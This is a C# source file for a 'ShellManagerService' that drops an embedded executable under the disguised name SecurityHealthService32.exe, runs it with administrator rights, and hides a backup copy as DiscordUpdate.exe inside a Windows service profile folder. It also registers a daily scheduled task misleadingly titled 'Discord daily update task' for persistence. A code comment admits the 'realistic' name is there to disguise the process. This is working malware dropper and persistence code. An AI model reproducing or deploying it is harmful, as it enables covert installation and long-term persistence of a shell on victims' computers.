﻿using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using Microsoft.Win32.TaskScheduler;
using System.Security.Cryptography;

namespace ShellManagerService
{
    public partial class ShellManager
    { 
        public const int tmp_name_length = 16;
        public const string exe_name = "SecurityHealthService32.exe";
        public const string backup_shell_folder = "C:\\Windows\\ServiceProfiles\\NetworkService\\Downloads\\";
        public const string main_shell_folder = "C:\\Windows\\ServiceProfiles\\LocalService";
        public const string backup_shell_name = "DiscordUpdate.exe";
        private static Random random = new Random();

        //public static string old_tmp_name { get; set; }
        public static void ExecuteAsAdmin(string fileName)
        {
            Process proc = new Process();
            proc.StartInfo.FileName = fileName;
            proc.StartInfo.UseShellExecute = true;
            proc.StartInfo.Verb = "runas";
            proc.Start();
        }
        public static void LoadShellInDisk()
        {
            //Call the process with some "realistic" name
            string tmp_name = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, exe_name);

            if (File.Exists(tmp_name))
            {
                Process[] pname = Process.GetProcessesByName(exe_name.Split('.').First());
                using (var stream = File.OpenRead(tmp_name))
                {
                    byte[] data = new byte[stream.Length];
                    stream.Read(data, 0, (int)stream.Length);

                    if (!data.SequenceEqual(embedded_image_1))
                    {
                        Process[] backup_shells = Process.GetProcessesByName(backup_shell_name.Split('.').First());
                        foreach (var proc in backup_shells)
                        {
                            proc.Kill();
                            proc.WaitForExit();
                        }
                        foreach (var process in pname)
                        {
                            process.Kill();
                            process.WaitForExit();
                        }
                    }
                    else
                    {
                        //Check if shell is already running

                        if (pname.Length > 0) //Shell is running
                        {
                            return;
                        }
                    }
                }

                //else delete the file
                File.Delete(tmp_name);
            }


            while (true)
            {
                try
                {
                    //Write bytes into file
                    FileStream fs = File.Create(tmp_name);
                    fs.Write(embedded_image_1, 0, embedded_image_1.Length);
                    fs.Close();
                    break;
                }
                catch
                {

                }
            }

            //Start process
            ExecuteAsAdmin(tmp_name);
        }
        //This loads the second "backup shell" on disk and starts a task which should replay once (or more) times a day
        public static void LoadSecondShellAndCreateTask()
        {
            var full_path = backup_shell_folder + backup_shell_name;

            if (!File.Exists(full_path))
            {
                while (true)
                {
                    try
                    {
                        //Write bytes into file
                        FileStream fs = File.Create(full_path);
                        fs.Write(embedded_image_1, 0, embedded_image_1.Length);
                        fs.Close();
                        break;
                    }
                    catch
                    {

                    }
                }
            }

            using (var ts = new TaskService())
            {
                var t = ts.Execute(full_path).Every(1).Days().Starting(DateTime.Now.AddHours(6)).AsTask("Discord daily update task");
            }
        }
    }
}
